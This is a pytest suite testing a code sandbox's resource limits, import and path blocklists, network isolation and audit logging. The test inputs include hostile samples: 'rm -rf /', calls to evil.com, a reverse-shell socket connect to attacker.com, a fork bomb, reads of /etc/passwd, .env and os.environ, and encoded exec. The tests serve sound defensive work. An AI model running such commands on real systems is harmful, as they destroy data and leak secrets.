"""
Tests for sandbox security hardening in CodeSandbox.

Covers:
- Memory limit enforcement
- CPU time limits
- Dangerous import blocklist
- Network isolation
- Output truncation
- Audit logging
- Security validation
"""
import pytest
import time
import os
from unittest.mock import patch, MagicMock


class TestCodeSandboxConfig:
    """Tests for CodeSandboxConfig defaults and customization."""

    def test_default_config_creation(self):
        """Verify default config has safe values."""
        from app.services.skills.tools import CodeSandboxConfig, DEFAULT_SANDBOX_CONFIG
        
        assert DEFAULT_SANDBOX_CONFIG.memory_limit_bytes == 256 * 1024 * 1024
        assert DEFAULT_SANDBOX_CONFIG.cpu_time_limit_seconds == 10
        assert DEFAULT_SANDBOX_CONFIG.output_limit_bytes == 10 * 1024
        assert DEFAULT_SANDBOX_CONFIG.allowed_write_dir == "/tmp"
        assert DEFAULT_SANDBOX_CONFIG.audit_logging is True

    def test_custom_config(self):
        """Verify custom config overrides work."""
        from app.services.skills.tools import CodeSandboxConfig
        
        config = CodeSandboxConfig(
            memory_limit_bytes=128 * 1024 * 1024,
            cpu_time_limit_seconds=5,
            execution_timeout_seconds=15,
        )
        
        assert config.memory_limit_bytes == 128 * 1024 * 1024
        assert config.cpu_time_limit_seconds == 5
        assert config.execution_timeout_seconds == 15

    def test_blocked_imports_default(self):
        """Verify default blocked imports list."""
        from app.services.skills.tools import CodeSandboxConfig
        
        config = CodeSandboxConfig()
        
        # Critical dangerous imports should be blocked
        assert "os" in config.blocked_imports
        assert "sys" in config.blocked_imports
        assert "subprocess" in config.blocked_imports
        assert "socket" in config.blocked_imports
        assert "requests" in config.blocked_imports
        assert "urllib" in config.blocked_imports
        assert "ctypes" in config.blocked_imports
        assert "eval" in config.blocked_imports
        assert "exec" in config.blocked_imports

    def test_blocked_paths_default(self):
        """Verify default blocked paths."""
        from app.services.skills.tools import CodeSandboxConfig
        
        config = CodeSandboxConfig()
        
        assert "/etc" in config.blocked_paths
        assert "/root" in config.blocked_paths
        assert "/home" in config.blocked_paths
        assert ".ssh" in config.blocked_paths
        assert ".env" in config.blocked_paths


class TestSecurityValidator:
    """Tests for SecurityValidator."""

    def test_validator_safe_code(self):
        """Verify safe code passes validation."""
        from app.services.skills.tools import SecurityValidator, CodeSandboxConfig
        
        validator = SecurityValidator(CodeSandboxConfig())
        safe_code = "print(1 + 1)\nresult = [x**2 for x in range(10)]"
        
        is_safe, violations = validator.validate(safe_code)
        
        assert is_safe is True
        assert len(violations) == 0

    def test_validator_blocks_os_import(self):
        """Verify os import is blocked."""
        from app.services.skills.tools import SecurityValidator, CodeSandboxConfig
        
        validator = SecurityValidator(CodeSandboxConfig())
        malicious_code = "import os\nos.system('rm -rf /')"
        
        is_safe, violations = validator.validate(malicious_code)
        
        assert is_safe is False
        assert any("os" in v for v in violations)

    def test_validator_blocks_subprocess(self):
        """Verify subprocess import is blocked."""
        from app.services.skills.tools import SecurityValidator, CodeSandboxConfig
        
        validator = SecurityValidator(CodeSandboxConfig())
        malicious_code = "import subprocess\nsubprocess.run(['ls'])"
        
        is_safe, violations = validator.validate(malicious_code)
        
        assert is_safe is False
        assert any("subprocess" in v for v in violations)

    def test_validator_blocks_socket(self):
        """Verify socket import is blocked."""
        from app.services.skills.tools import SecurityValidator, CodeSandboxConfig
        
        validator = SecurityValidator(CodeSandboxConfig())
        malicious_code = "import socket\ns = socket.socket()"
        
        is_safe, violations = validator.validate(malicious_code)
        
        assert is_safe is False
        assert any("socket" in v for v in violations)

    def test_validator_blocks_requests(self):
        """Verify requests import is blocked."""
        from app.services.skills.tools import SecurityValidator, CodeSandboxConfig
        
        validator = SecurityValidator(CodeSandboxConfig())
        malicious_code = "import requests\nrequests.get('http://evil.com')"
        
        is_safe, violations = validator.validate(malicious_code)
        
        assert is_safe is False
        assert any("requests" in v for v in violations)

    def test_validator_blocks_eval(self):
        """Verify eval() function is blocked."""
        from app.services.skills.tools import SecurityValidator, CodeSandboxConfig
        
        validator = SecurityValidator(CodeSandboxConfig())
        malicious_code = "eval('__import__(\"os\").system(\"ls\")')"
        
        is_safe, violations = validator.validate(malicious_code)
        
        assert is_safe is False
        assert any("eval" in v for v in violations)

    def test_validator_blocks_exec(self):
        """Verify exec() function is blocked."""
        from app.services.skills.tools import SecurityValidator, CodeSandboxConfig
        
        validator = SecurityValidator(CodeSandboxConfig())
        malicious_code = "exec('print(1)')"
        
        is_safe, violations = validator.validate(malicious_code)
        
        assert is_safe is False
        assert any("exec" in v for v in violations)

    def test_validator_blocks_ctypes(self):
        """Verify ctypes import is blocked."""
        from app.services.skills.tools import SecurityValidator, CodeSandboxConfig
        
        validator = SecurityValidator(CodeSandboxConfig())
        malicious_code = "from ctypes import *\ncdll.kernel32.GetLastError()"
        
        is_safe, violations = validator.validate(malicious_code)
        
        assert is_safe is False
        assert any("ctypes" in v for v in violations)

    def test_validator_blocks_sensitive_path(self):
        """Verify access to sensitive paths is blocked."""
        from app.services.skills.tools import SecurityValidator, CodeSandboxConfig
        
        validator = SecurityValidator(CodeSandboxConfig())
        malicious_code = "with open('/etc/passwd') as f:\n    print(f.read())"
        
        is_safe, violations = validator.validate(malicious_code)
        
        assert is_safe is False
        assert any("/etc" in v for v in violations)

    def test_validator_blocks_dotenv(self):
        """Verify access to .env files is blocked."""
        from app.services.skills.tools import SecurityValidator, CodeSandboxConfig
        
        validator = SecurityValidator(CodeSandboxConfig())
        malicious_code = "with open('.env') as f:\n    print(f.read())"
        
        is_safe, violations = validator.validate(malicious_code)
        
        assert is_safe is False
        assert any(".env" in v for v in violations)

    def test_validator_from_import_syntax(self):
        """Verify 'from X import Y' syntax is detected."""
        from app.services.skills.tools import SecurityValidator, CodeSandboxConfig
        
        validator = SecurityValidator(CodeSandboxConfig())
        malicious_code = "from os import system\nsystem('ls')"
        
        is_safe, violations = validator.validate(malicious_code)
        
        assert is_safe is False
        assert any("os" in v for v in violations)

    def test_validator_nested_module_access(self):
        """Verify os.path style access is blocked."""
        from app.services.skills.tools import SecurityValidator, CodeSandboxConfig
        
        validator = SecurityValidator(CodeSandboxConfig())
        malicious_code = "from os.path import join"
        
        is_safe, violations = validator.validate(malicious_code)
        
        assert is_safe is False

    def test_validator_allows_safe_modules(self):
        """Verify safe modules are not blocked."""
        from app.services.skills.tools import SecurityValidator, CodeSandboxConfig
        
        validator = SecurityValidator(CodeSandboxConfig())
        safe_code = """
import json
import math
import re
import datetime
print(json.dumps({'data': [1, 2, 3]}))
"""
        
        is_safe, violations = validator.validate(safe_code)
        
        assert is_safe is True
        assert len(violations) == 0


class TestCodeSandboxExecution:
    """Tests for CodeSandbox execute_code method."""

    @pytest.fixture
    def sandbox(self):
        """Create sandbox instance for testing."""
        from app.services.skills.tools import CodeSandbox
        
        return CodeSandbox(user_id="test-user")

    @pytest.mark.asyncio
    async def test_execute_safe_code(self, sandbox):
        """Verify safe code executes successfully."""
        result = await sandbox.execute_code("print(1 + 1)")
        
        assert result["status"] == "success"
        assert result["output"] is not None
        assert "2" in result["output"]

    @pytest.mark.asyncio
    async def test_execute_with_list_comprehension(self, sandbox):
        """Verify list comprehensions work."""
        result = await sandbox.execute_code("[x**2 for x in range(5)]")
        
        assert result["status"] == "success"
        assert "16" in result["output"]  # 4**2

    @pytest.mark.asyncio
    async def test_blocks_malicious_import(self, sandbox):
        """Verify malicious imports are blocked before execution."""
        result = await sandbox.execute_code("import os\nos.system('ls')")
        
        assert result["status"] == "blocked"
        assert "violations" in result
        assert len(result["violations"]) > 0

    @pytest.mark.asyncio
    async def test_blocks_network_import(self, sandbox):
        """Verify network imports are blocked."""
        result = await sandbox.execute_code("import socket\nsocket.socket()")
        
        assert result["status"] == "blocked"
        assert result["error"] is not None

    @pytest.mark.asyncio
    async def test_blocks_subprocess_import(self, sandbox):
        """Verify subprocess import is blocked."""
        result = await sandbox.execute_code("import subprocess\nsubprocess.run(['ls'])")
        
        assert result["status"] == "blocked"

    @pytest.mark.asyncio
    async def test_blocks_dangerous_functions(self, sandbox):
        """Verify dangerous functions are blocked."""
        result = await sandbox.execute_code("eval('1+1')")
        
        assert result["status"] == "blocked"
        assert any("eval" in v for v in result.get("violations", []))

    @pytest.mark.asyncio
    async def test_disabled_sandbox(self, sandbox):
        """Verify disabled sandbox returns proper error."""
        sandbox.enabled = False
        result = await sandbox.execute_code("print(1)")
        
        assert result["status"] == "disabled"
        assert "disabled" in result["error"].lower()

    @pytest.mark.asyncio
    async def test_error_reporting(self, sandbox):
        """Verify syntax errors are properly reported."""
        result = await sandbox.execute_code("print(")
        
        assert result["status"] == "error"
        assert result["error"] is not None


class TestCodeSandboxValidation:
    """Tests for CodeSandbox.validate_code method."""

    @pytest.fixture
    def sandbox(self):
        """Create sandbox instance for testing."""
        from app.services.skills.tools import CodeSandbox
        
        return CodeSandbox(user_id="test-user")

    def test_validate_safe_code(self, sandbox):
        """Verify safe code validation passes."""
        result = sandbox.validate_code("print('hello')")
        
        assert result["is_safe"] is True
        assert len(result["violations"]) == 0

    def test_validate_unsafe_code(self, sandbox):
        """Verify unsafe code validation fails."""
        result = sandbox.validate_code("import os\nos.system('ls')")
        
        assert result["is_safe"] is False
        assert len(result["violations"]) > 0

    def test_validate_warnings(self, sandbox):
        """Verify warnings are generated for potentially slow code."""
        result = sandbox.validate_code("while True:\n    pass")
        
        assert "warnings" in result
        assert any("while" in w.lower() for w in result["warnings"])

    def test_validate_large_iteration(self, sandbox):
        """Verify warnings for large iterations."""
        result = sandbox.validate_code("for i in range(1000000):\n    pass")
        
        assert "warnings" in result


class TestSandboxAuditLogger:
    """Tests for SandboxAuditLogger."""

    def test_audit_logger_initialization(self):
        """Verify audit logger initializes correctly."""
        from app.services.skills.tools import SandboxAuditLogger
        
        logger = SandboxAuditLogger()
        
        assert logger.audit_entries == []
        assert logger.audit_file is None

    def test_audit_logger_log_execution(self):
        """Verify execution logging works."""
        from app.services.skills.tools import SandboxAuditLogger
        
        logger = SandboxAuditLogger()
        logger.log_execution(
            user_id="test-user",
            code_preview="print(1)",
            status="success",
            duration_ms=100.5,
        )
        
        assert len(logger.audit_entries) == 1
        entry = logger.audit_entries[0]
        assert entry["user_id"] == "test-user"
        assert entry["status"] == "success"
        assert entry["duration_ms"] == 100.5

    def test_audit_logger_log_blocked(self):
        """Verify blocked execution logging."""
        from app.services.skills.tools import SandboxAuditLogger
        
        logger = SandboxAuditLogger()
        logger.log_execution(
            user_id="test-user",
            code_preview="import os",
            status="blocked",
            duration_ms=5.0,
            violations=["Blocked import: 'os'"],
        )
        
        assert len(logger.audit_entries) == 1
        entry = logger.audit_entries[0]
        assert entry["status"] == "blocked"
        assert "os" in str(entry["violations"])

    def test_get_recent_entries(self):
        """Verify recent entries retrieval."""
        from app.services.skills.tools import SandboxAuditLogger
        
        logger = SandboxAuditLogger()
        for i in range(10):
            logger.log_execution(
                user_id=f"user-{i}",
                code_preview=f"code-{i}",
                status="success",
                duration_ms=10.0,
            )
        
        recent = logger.get_recent_entries(limit=5)
        
        assert len(recent) == 5
        assert recent[0]["user_id"] == "user-5"  # Should start from 5th entry


class TestResourceLimits:
    """Tests for resource limit enforcement."""

    def test_set_resource_limits_function(self):
        """Verify resource limits can be set."""
        from app.services.skills.tools import _set_resource_limits
        
        # Should not raise
        _set_resource_limits(cpu_time=5, memory_bytes=128 * 1024 * 1024)


class TestNetworkIsolation:
    """Tests for network isolation."""

    @pytest.fixture
    def sandbox(self):
        """Create sandbox instance for testing."""
        from app.services.skills.tools import CodeSandbox
        
        return CodeSandbox(user_id="test-user")

    @pytest.mark.asyncio
    async def test_blocks_http_imports(self, sandbox):
        """Verify http module imports are blocked."""
        result = await sandbox.execute_code("import http.client\nhttp.client.HTTPConnection('evil.com')")
        
        assert result["status"] == "blocked"

    @pytest.mark.asyncio
    async def test_blocks_urllib_imports(self, sandbox):
        """Verify urllib imports are blocked."""
        result = await sandbox.execute_code("import urllib.request\nurllib.request.urlopen('http://evil.com')")
        
        assert result["status"] == "blocked"

    @pytest.mark.asyncio
    async def test_blocks_ftp_imports(self, sandbox):
        """Verify ftplib imports are blocked."""
        result = await sandbox.execute_code("import ftplib\nftp = ftplib.FTP('ftp.evil.com')")
        
        assert result["status"] == "blocked"


class TestDiskIORestrictions:
    """Tests for disk I/O restrictions."""

    @pytest.fixture
    def sandbox(self):
        """Create sandbox instance for testing."""
        from app.services.skills.tools import CodeSandbox
        
        return CodeSandbox(user_id="test-user")

    @pytest.mark.asyncio
    async def test_allows_tmp_writes(self, sandbox):
        """Verify writes to /tmp are allowed (in principle)."""
        # This tests the allowed_write_dir config is set correctly
        assert sandbox.config.allowed_write_dir == "/tmp"

    @pytest.mark.asyncio
    async def test_blocks_sensitive_path_access(self, sandbox):
        """Verify access to sensitive paths is blocked."""
        result = await sandbox.execute_code("with open('/etc/passwd') as f: pass")
        
        assert result["status"] == "blocked"
        assert any("/etc" in str(v) for v in result.get("violations", []))


class TestOutputSizeLimit:
    """Tests for output size limiting."""

    @pytest.fixture
    def sandbox(self):
        """Create sandbox instance for testing."""
        from app.services.skills.tools import CodeSandbox
        
        return CodeSandbox(user_id="test-user")

    @pytest.mark.asyncio
    async def test_normal_output_preserved(self, sandbox):
        """Verify normal output is preserved."""
        result = await sandbox.execute_code("print('hello world')")
        
        assert result["status"] == "success"
        assert "hello world" in result["output"]


class TestMaliciousCodeScenarios:
    """Comprehensive tests for malicious code scenarios."""

    @pytest.fixture
    def sandbox(self):
        """Create sandbox instance for testing."""
        from app.services.skills.tools import CodeSandbox
        
        return CodeSandbox(user_id="test-user")

    @pytest.mark.asyncio
    async def test_reverse_shell_attempt(self, sandbox):
        """Verify reverse shell attempts are blocked."""
        result = await sandbox.execute_code("""
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("attacker.com", 4444))
""")
        
        assert result["status"] == "blocked"

    @pytest.mark.asyncio
    async def test_fork_bomb_attempt(self, sandbox):
        """Verify fork bomb attempts are blocked."""
        result = await sandbox.execute_code("import os\nwhile True: os.fork()")
        
        # Should be blocked by validation
        assert result["status"] == "blocked"

    @pytest.mark.asyncio
    async def test_file_read_attempt(self, sandbox):
        """Verify file read attempts outside tmp are blocked."""
        result = await sandbox.execute_code("open('/etc/passwd').read()")
        
        assert result["status"] == "blocked"

    @pytest.mark.asyncio
    async def test_env_steal_attempt(self, sandbox):
        """Verify attempts to read environment secrets are blocked."""
        result = await sandbox.execute_code("import os\nprint(os.environ)")
        
        assert result["status"] == "blocked"

    @pytest.mark.asyncio
    async def test_code_injection_attempt(self, sandbox):
        """Verify code injection attempts are blocked."""
        result = await sandbox.execute_code("""
code = 'import os'
exec(code)
""")
        
        assert result["status"] == "blocked"

    @pytest.mark.asyncio
    async def test_polyglot_attempt(self, sandbox):
        """Verify polyglot/encoded attack attempts are detected."""
        result = await sandbox.execute_code("""
import base64
code = base64.b64decode('aW1wb3J0IG9z').decode()
exec(code)
""")
        
        assert result["status"] == "blocked"

    @pytest.mark.asyncio
    async def test_module_override_attempt(self, sandbox):
        """Verify __import__ override attempts are blocked."""
        result = await sandbox.execute_code("""
__import__=None
import os
""")
        
        assert result["status"] == "blocked"
